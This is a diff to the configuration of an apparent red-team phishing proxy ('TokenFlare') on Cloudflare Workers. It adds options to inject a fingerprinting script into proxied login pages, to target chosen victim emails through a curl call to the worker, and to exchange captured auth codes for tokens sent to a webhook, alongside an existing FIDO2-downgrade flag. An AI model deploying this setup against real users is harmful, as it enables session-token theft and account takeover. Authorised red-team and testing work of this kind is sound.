@@ -87,6 +87,22 @@ CUSTOM_USER_AGENT='TokenFlare/1.0 For_Authorised_Testing_Only'
 # and fall back to phishable MFA methods (push, TOTP, SMS)
 FIDO2_DOWNGRADE = "false"
 
+# ── HTML Injection ──────────────────────────────────────────────
+# When enabled, injects a telemetry script into login page responses
+# Captures: form field timing, browser fingerprint, page visibility events
+HTML_INJECTION = "false"
+
+# --- Victim Targeting ---
+# When enabled, only proxies auth flows for emails stored in the SESSIONS KV.
+# Add targets via: curl -X POST https://your-worker/api/targets -d '{"emails":["user@company.com"]}'
+# When disabled (default), all visitors are proxied.
+TARGETING_ENABLED = "false"
+
+# --- Edge Token Exchange ---
+# When enabled, exchanges auth codes directly at the Cloudflare edge (faster than webhook).
+# Tokens are sent to the webhook as pre-exchanged (event: 'edge_exchange').
+EDGE_EXCHANGE = "false"
+
 # ── Workers KV Session Storage ──────────────────────────────────────
 # Stores per-victim session timelines correlating all auth flow captures.
 # Create the namespace: wrangler kv:namespace create "SESSIONS"
